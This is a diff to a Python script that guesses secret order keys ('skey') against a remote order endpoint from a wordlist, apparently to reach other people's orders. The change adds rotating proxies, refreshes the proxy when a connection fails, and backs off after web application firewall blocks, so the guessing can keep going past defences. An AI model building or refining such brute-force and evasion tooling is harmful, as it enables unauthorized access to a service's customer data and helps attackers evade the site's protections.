@@ -16,7 +16,7 @@ SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
 DEFAULT_WORDLIST = os.path.join(SCRIPT_DIR, "xinhe_skey_wordlist.txt")
 
 try:
-    from qingguo_proxy import get_proxy, egress_ip
+    from qingguo_proxy import get_proxy, egress_ip, clear_proxy_cache
     HAS_QG = True
 except ImportError:
     HAS_QG = False
@@ -65,7 +65,7 @@ def gen_skeys(extra=None, order_id=None):
     return list(s)
 
 
-def post_order(oid, skey, timeout=20, delay=None):
+def post_order(oid, skey, timeout=20, delay=None, proxy_url=None):
     d = delay if delay is not None else DELAY
     time.sleep(d)
     data = f"id={oid}&skey={skey}"
@@ -77,10 +77,12 @@ def post_order(oid, skey, timeout=20, delay=None):
     ]
     if USE_PROXY and HAS_QG:
         try:
-            px = get_proxy()
-            cmd += ["-x", px["proxy_url"]]
+            px = proxy_url or get_proxy()["proxy_url"]
+            cmd += ["-x", px]
         except Exception as e:
-            print(f"[!] proxy error: {e}", file=sys.stderr)
+            return f"proxy error: {e}"
+    elif proxy_url:
+        cmd += ["-x", proxy_url]
     cmd += ["-d", data, BASE]
     try:
         return subprocess.check_output(cmd, stderr=subprocess.STDOUT).decode("utf-8", "replace")
@@ -89,14 +91,29 @@ def post_order(oid, skey, timeout=20, delay=None):
 
 
 def try_id(oid, passwords, verbose=True, delay=None):
+    proxy_url = None
+    if USE_PROXY and HAS_QG:
+        try:
+            proxy_url = get_proxy()["proxy_url"]
+        except Exception as e:
+            print(f"[!] proxy init error: {e}", file=sys.stderr)
+            return {"hit": False, "id": oid}
     for skey in passwords:
-        body = post_order(oid, skey, delay=delay)
+        body = post_order(oid, skey, delay=delay, proxy_url=proxy_url)
+        if any(x in body for x in ("408", "CONNECT tunnel failed", "proxy error", "timed out", "reset")):
+            if USE_PROXY and HAS_QG:
+                clear_proxy_cache()
+                try:
+                    proxy_url = get_proxy(force_new=True)["proxy_url"]
+                    body = post_order(oid, skey, delay=delay, proxy_url=proxy_url)
+                except Exception as e:
+                    print(f"[!] proxy refresh error: {e}", file=sys.stderr)
         if "reset" in body.lower() or "Empty reply" in body:
             print(f"[!] WAF block on id={oid}, backing off 60s", file=sys.stderr)
             time.sleep(60)
             body = post_order(oid, skey, delay=delay)
         if verbose:
-            print(f"  id={oid} skey={skey!r:15} -> {body[:120]}")
+            print(f"  id={oid} skey={skey!r:15} -> {body[:120]}", flush=True)
         if '"code":0' in body:
             try:
                 j = json.loads(body)
